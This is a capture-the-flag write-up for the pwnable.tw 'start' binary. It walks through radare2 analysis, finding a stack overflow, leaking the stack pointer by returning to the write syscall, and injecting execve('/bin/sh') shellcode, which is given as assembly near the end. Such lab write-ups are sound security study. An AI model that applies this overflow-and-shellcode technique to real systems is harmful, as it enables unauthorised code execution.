# WRITE UP

## Challenge description

The goal is to get the flag pwning the binary that is running on server.
This challenge is worth 100 points.
The challenge is reachble to: `nc chall.pwnable.tw 10000`.

## Binary description

### Binary Information

The first thing I do usually is extracting the binary information in order to know how many hardening has the binary.

Opening the binary with `r2` and analizying it with the `aaa` command.
Below the binary dumped information.

```
[0x08048060]> iI
arch     x86
baddr    0x8048000
binsz    364
bintype  elf
bits     32
canary   false
class    ELF32
crypto   false
endian   little
havecode true
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   true
rpath    NONE
sanitiz  false
static   true
stripped false
subsys   linux
va       true
```

So now we know that the binary does not have the stack canary and the not-executable stack. This means that would be possible to trigger stack overflow and
jumping directly on the shellcode placed on the stack-self.

#### Binary strings

It is important to check if the binary contains the string, assuming we don't know that pwning challenge means exploits the binary.

Running the `izz` command we can get the strings contained in the whole binary:

```
[0x08048060]> izz
[Strings]
nth paddr      vaddr      len size section   type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x0000006e 0x0804806e 25  26   .text     ascii hCTF:hthe hart hs sthLet'
1   0x0000008f 0x0804808f 4   7    .text     utf8  ̀1۲< blocks=Combining
Diacritical Marks,Basic Latin,Arabic
2   0x00000125 0x00000001 7   8    .strtab   ascii start.s
3   0x0000012d 0x00000009 5   6    .strtab   ascii _exit
4   0x00000133 0x0000000f 11  12   .strtab   ascii __bss_start
5   0x0000013f 0x0000001b 6   7    .strtab   ascii _edata
6   0x00000146 0x00000022 4   5    .strtab   ascii _end
7   0x0000014c 0x00000001 7   8    .shstrtab ascii .symtab
8   0x00000154 0x00000009 7   8    .shstrtab ascii .strtab
9   0x0000015c 0x00000011 9   10   .shstrtab ascii .shstrtab
10  0x00000166 0x0000001b 5   6    .shstrtab ascii .text
```

Of course there is no evidence of the flag string.

### Binary system call map

Now let see how the program works just executing it under an `strace` like program.

```
$ strace ./start
execve("./start", ["./start"], 0x7ffeba647180 /* 38 vars */) = 0
strace: [ Process PID=30296 runs in 32 bit mode. ]
write(1, "Let's start the CTF:", 20Let's start the CTF:)    = 20
read(0, hello
"hello\n", 60)                  = 6
exit(0)                                 = ?
+++ exited with 0 +++
```

Seems that it does just a write() and a read(). At this point we don't know if this binary has some branches execution according to the read string,
we can investigate this just by debugging it or looking at its assembly code. Anyway from the `strace` we understood that the maximum string read is 60 bytes
so the buffer must be at most 60 bytes. Let's try to check this.

### Found the vulnerability

```
$ python3 -c 'print("A"*60)' | ./start
Let\'s start the CTF:[1]    30586 done                              python3 -c'print("A"*60)' | 
       30587 segmentation fault (core dumped)  ./start
       25m ◒  ⍉
$ dmesg | tail -n 2
       [45149.780782] start[30587]: segfault at 41414141 ip 0000000041414141 sp
       00000000ff81d0ac error 14
       [45149.780791] Code: Bad RIP value.
```

The vulnerability has been discovered, it is a stack overflow problem. Basically the buffer can store less than 60 bytes.
Now it is required to find how many bytes can contains the buffer and how many bytes are required to overwrite the the return address.
We have two way in order to discover how many bytes is long the buffer:

1. Trying in a binary search way to guess after how many bytes we overwrite the return pointer.
2. Read the disassembled code.

Of course the second way is faster one.

#### Buffer length

Let's open the binary with radare2 and exploring the functions and especially the read() system call.
Open binary with r2 analyzing it with `aaa`.

Get the functions list:

```
[0x08048060]> afl
0x08048060    1 61           entry0
```

So there is just one function in this binary. Let's disassemble it.

```
[0x08048060]> pdf @ entry0
            ;-- section..text:
            ;-- .text:
            ;-- _start:
            ;-- eip:
┌ 61: entry0 ();
│           0x08048060      54             push esp                    ; [01] -r-x section size 67 named .text
│           0x08048061      689d800408     push loc.\_exit              ; 0x804809d ; "\1\xc0@\u0340\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" ; int status
│           0x08048066      31c0           xor eax, eax
│           0x08048068      31db           xor ebx, ebx
│           0x0804806a      31c9           xor ecx, ecx
│           0x0804806c      31d2           xor edx, edx
│           0x0804806e      684354463a     push 0x3a465443             ; 'CTF:'
│           0x08048073      6874686520     push 0x20656874             ; 'the '
│           0x08048078      6861727420     push 0x20747261             ; 'art '
│           0x0804807d      6873207374     push 0x74732073             ; 's st'
│           0x08048082      684c657427     push 0x2774654c             ; 'Let''
│           0x08048087      89e1           mov ecx, esp
│           0x08048089      b214           mov dl, 0x14                ; 20
│           0x0804808b      b301           mov bl, 1
│           0x0804808d      b004           mov al, 4
│           0x0804808f      cd80           int 0x80
│           0x08048091      31db           xor ebx, ebx
│           0x08048093      b23c           mov dl, 0x3c                ; '<' ; 60
│           0x08048095      b003           mov al, 3
│           0x08048097      cd80           int 0x80
│           0x08048099      83c414         add esp, 0x14
└           0x0804809c      c3             ret
```

Below the description at high level of the function:

* offset `0x00` - Push the stack pointer. Interesting could be useful for a leak!
* offset `0x01` - Pushes return address to stack, the return address points to the exit function.
* offset `0x06` - Zeroes registers used in the x86 32 bits to pass function arguments and to store the return value.
                  On x86 architecture the ABI for the system calls is to set the `eax` register to contain the syscall number and return value,
                  the registers `ebx`, `ecx`, `edx`, `esi`, `edi` and `ebp` as 1st, 2nd, 3rd, 4th, 5th and 6th argument for the system call.
* offset `0x0e` - Pushes to the stack the first string written by the binary `Let's start the CTF:`.
* offset `0x27` - Store into `ecx` the stack pointer that now points to the string previously pushed.
* offset `0x29` - Store in the registers the system calls parameters.
* offset `0x2f` - System call interrupt is issued: syscall(4, 1, $ecx, 0x14) == write(1, "Let's start the CTF:", strlen("Let's start the CTF"))
* offset `0x37` - System call interrupt is issued: syscall(3, 0, $ecx, 0x3c) == read(0, $ecx == $esp, 0x3c)
* offset `0x39` - Free the stack adding how many bytes were reserved for the buffer.
* offset `0x3c` - Return, jump to the address contained on the stack: `call \*esp`.

--------------------------------------------------------------------------------------------------------------------------------------------------------------
***Small note on the stack***

The stack is a memory area used to store the function local variables, and to store the function's return addresses.
This memory area is organized as a LIFO ( Last In First Out ), e.g. the first argument is pushed at the end since it is the first.

The operations that is possible to do on the stack are two:

1. Allocation - Store data on the stack by decreasing the stack pointer represented in x86 by esp, in x86_64 by rsp and in ARM by sp.
                The common operation in assembly is `push data` that basically means: `sub esp, <bytes to allocate>; str esp, data;`
2. Release    - Release data previously allocated by moving the stack pointer forward.
                The common operation in assembly is `pop reg` that basically means: `ldr reg, esp; add esp <bytes to free>`

Since the allocation means decreasing stack pointer the stack grows to ***lowest*** addresses, indeed the esp of a program is a very high address.
Example:

```
                                           0x0   ...
                                           0x8   ...
                                           0x16  ...
                                           0x24  Unused/Unallocated stack
                                           0x32  Unused/Unallocated stack
    read(0, buffer, 0x50)                  0x40  stack-pointer local var 1
                                           0x48                local var 2
                                           0x56                buffer
                                           0xa6                local var 3
                                                               ...
                                                               ...
                                           0xNN                return address
```

Of course if the read() is not checked the data from the data could overwrite the return address so stack-overflow.
Anyway today there is the stack-canary that protects from this kind of attacks, below an example:

```
                                           0x0   ...
                                           0x8   ...
                                           0x16  ...
                                           0x24  Unused/Unallocated stack
                                           0x32  Unused/Unallocated stack
    read(0, buffer, 0x50)                  0x40  stack-pointer local var 1
                                           0x48                local var 2
                                           0x56                buffer
                                           0xa6                local var 3
                                                               ...
                                           0xNN-8              canary
                                           0xNN                return address
```

When the canary is overwritten the program ends in an ABORT.
--------------------------------------------------------------------------------------------------------------------------------------------------------------

Back to the ctf, so now we got a stack overflow, no canary and the stack executable but the stack pointer is random. Now it is trivial to solve.

#### DEBUG and Exploiting

It is possible to put on the stack a shellcode to executes some command or the shell. Got 20 bytes to store the shellcode could be enough.
But there is still a problem, the stack address on which jump is unknown. Since the binary is for x86 32bits an feasible solution attack is
to brute force the stack-pointer but this is so bad. It is possible to trigger a data leak, just jumping on 

On radare2 issuing `doo` to start debugging the binary and pass to visual mode `V!` set a breakpoint on the `int 0x80` of the write and inspects
the stack.

```
Dump 0x24 bytes from the stack and prints as words.

:> pxr 0x20 @esp
0xffc99a24 0x2774654c  Let' @esp ascii ('L')
0xffc99a28 0x74732073  s st ascii ('s')
0xffc99a2c 0x20747261  art  ascii ('a')
0xffc99a30 0x20656874  the  ascii ('t')
0xffc99a34 0x3a465443  CTF: ascii ('C')
0xffc99a38 0x0804809d  ....
(/home/mcamp/Desktop/CTFS/pwnable.tw/start-100-pts/start) (.text) loc.\_exit
0xffc99a3c 0xffc99a40  @... 0 panel.addr
0xffc99a40 0x00000001  .... 0 panel.addr
```

So the best approach could be to overwrite the return address in order to return on the instruction that prepares the write() system call `0x08048087`.
Since the stack is contains respectively from lower address:

1. 0x14 bytes for the buffer
2. 0x4 bytes for the return address
3. 0x4 stack address, pushed in the first instruction.

Overwriting the return address with `0x08048087` will lead to a leak with the write(1, 0xffc99a3c, 0x14).
Reading the first four bytes we got the `stack pointer + 4 = 0xffc99a40`, now we can exploit it just writing `20 trash bytes + esp + 4 + 0x14 + shellcode`.
But `esp == leaked address - 4` so finally we must write `A*20 + bytes(leaked_addr+0x14) + shellcode`.

Pay attention the shell code must be at most 36 bytes for the read().

So below the steps we need to exploits it:

1. read()  - write 20 trash bytes + 0x08048087, at this point another write() is issued.
2. write() - store the first 4 bytes, let's call them as stack-pointer.
3. read()  - write 20-bytes-shellcode + (stack-pointer + 0x14) + shellcode read on the point 2.

Notice that each time another write is triggered the stack pointer increase by 20 bytes and the stack memory decrease since adding means release memory,
For this It is possible to load bigger shellcodes just looping over the first and second step and adjusting the shellcode with for example a jmp +4 after the first
16 bytes loaded.

```
esp             ==> shellcode + 0           == instruction
esp + 0x10      ==> shellcode + 0x10        == jmp 4
esp + 0x14      ==> ret address overwrite
esp + 0x18      ==> shellcode + 0x14        == instruction
...
...
...
```

***Important***

At the point two the stack would be as below:

```
esp (leaked address - 4) ===> 0x14 bytes
esp + 0x14               ===> shellcode address ( leaked address + 0x14)
esp + 0x14 + 0x4         ===> shellcode
```

#### Shellcode

36 bytes for the shellcode are enough, we just need two system calls.

Below is shown the shellcode:

```
'push 0xb\n'        # execve syscall number
'pop eax\n'         # store in eax
'push 0\n'
'push 0x68732f2f\n'
'push 0x6e69622f\n' # push /bin/sh\0
'mov ebx,esp\n'     # store the string address on ebx
'mov ecx, 0\n'      # reset ecx
'mov edx, 0\n'      # reset edx
'int 0x80\n',
```

This shellcode was taken from [here](https://www.exploit-db.com/exploits/44321) and adapted.

